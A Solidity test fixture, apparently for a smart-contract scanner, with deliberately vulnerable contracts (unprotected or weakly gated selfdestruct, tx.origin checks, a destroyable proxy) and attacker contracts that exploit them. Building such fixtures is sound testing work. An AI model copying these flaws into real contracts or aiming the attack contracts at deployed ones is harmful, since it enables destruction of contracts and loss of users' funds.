// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title SelfdestructVulnerable
 * @notice This contract demonstrates CRITICAL selfdestruct vulnerabilities
 * @dev INTENTIONALLY VULNERABLE - For testing Web3CRIT Scanner
 */
contract SelfdestructVulnerable {
    address public owner;
    mapping(address => uint256) public balances;
    uint256 public totalDeposits;

    constructor() {
        owner = msg.sender;
    }

    /**
     * @notice VULNERABILITY: Completely unprotected selfdestruct
     * @dev Anyone can destroy the contract and steal all funds!
     */
    function destroy(address payable recipient) public {
        // VULNERABILITY: No access control whatsoever
        selfdestruct(recipient);
    }

    /**
     * @notice VULNERABILITY: Selfdestruct with broken access control
     * @dev Modifier exists but doesn't actually protect
     */
    modifier onlyOwner() {
        require(true);  // Always passes!
        _;
    }

    function destroyWithBrokenModifier(address payable recipient) public onlyOwner {
        selfdestruct(recipient);
    }

    /**
     * @notice VULNERABILITY: Selfdestruct with weak tx.origin check
     * @dev Vulnerable to phishing attacks
     */
    function destroyWithTxOrigin(address payable recipient) public {
        require(tx.origin == owner, "Not owner");
        selfdestruct(recipient);
    }

    /**
     * @notice VULNERABILITY: Selfdestruct callable by anyone after timestamp
     * @dev Time-based access control is weak and manipulable
     */
    function timedDestroy(address payable recipient) public {
        require(block.timestamp > 1700000000, "Too early");
        selfdestruct(recipient);
    }

    /**
     * @notice VULNERABILITY: Selfdestruct with balance-based access
     * @dev Anyone with enough ETH can destroy the contract
     */
    function balanceBasedDestroy(address payable recipient) public {
        require(msg.sender.balance > 10 ether, "Need 10 ETH");
        selfdestruct(recipient);
    }

    /**
     * @notice VULNERABILITY: Selfdestruct in fallback function
     * @dev Contract can be destroyed by sending a specific amount
     */
    receive() external payable {
        if (msg.value == 0.1337 ether) {
            selfdestruct(payable(msg.sender));
        } else {
            balances[msg.sender] += msg.value;
            totalDeposits += msg.value;
        }
    }

    /**
     * @notice VULNERABILITY: Selfdestruct via delegatecall
     * @dev Indirect selfdestruct through user-controlled delegatecall
     */
    function executeCode(address target, bytes memory data) public {
        require(msg.sender == owner, "Only owner");
        // VULNERABILITY: Owner can delegatecall to contract with selfdestruct
        target.delegatecall(data);
    }

    function deposit() public payable {
        require(msg.value > 0, "Must send ETH");
        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;
    }

    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        totalDeposits -= amount;
        payable(msg.sender).transfer(amount);
    }
}

/**
 * @title ProxyWithSelfdestruct
 * @notice Proxy that can be destroyed, breaking all dependent contracts
 */
contract ProxyWithSelfdestruct {
    address public implementation;
    address public admin;

    constructor(address _implementation) {
        implementation = _implementation;
        admin = msg.sender;
    }

    /**
     * @notice VULNERABILITY: Admin can destroy proxy, breaking all users
     * @dev Even with access control, selfdestruct in proxy is dangerous
     */
    function destroyProxy(address payable recipient) public {
        require(msg.sender == admin, "Only admin");
        // VULNERABILITY: Destroys proxy, breaking all dependent systems
        selfdestruct(recipient);
    }

    receive() external payable {
        // Accept ETH transfers
    }

    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

/**
 * @title SelfdestructHelper
 * @notice Helper contract used in delegatecall attack
 */
contract SelfdestructHelper {
    function killContract() public {
        selfdestruct(payable(msg.sender));
    }
}

/**
 * @title SelfdestructAttacker
 * @notice Demonstrates various selfdestruct attack vectors
 */
contract SelfdestructAttacker {
    SelfdestructVulnerable public victim;

    constructor(address _victim) {
        victim = SelfdestructVulnerable(payable(_victim));
    }

    /**
     * @notice Exploit unprotected selfdestruct
     */
    function attackDirect() public {
        victim.destroy(payable(address(this)));
    }

    /**
     * @notice Exploit tx.origin vulnerability
     */
    function attackTxOrigin() public {
        // Trick owner into calling this
        victim.destroyWithTxOrigin(payable(address(this)));
    }

    /**
     * @notice Exploit via fallback function
     */
    function attackFallback() public payable {
        require(msg.value >= 0.1337 ether, "Need 0.1337 ETH");
        payable(address(victim)).transfer(0.1337 ether);
    }

    receive() external payable {}
}

/**
 * @title ForceFeedAttack
 * @notice Uses selfdestruct to force-feed ETH to a contract
 * @dev Demonstrates why contracts shouldn't rely on address(this).balance
 */
contract ForceFeedAttack {
    function forceFeed(address payable target) public payable {
        // Force-feeds ETH to target even if it has no payable functions
        selfdestruct(target);
    }
}
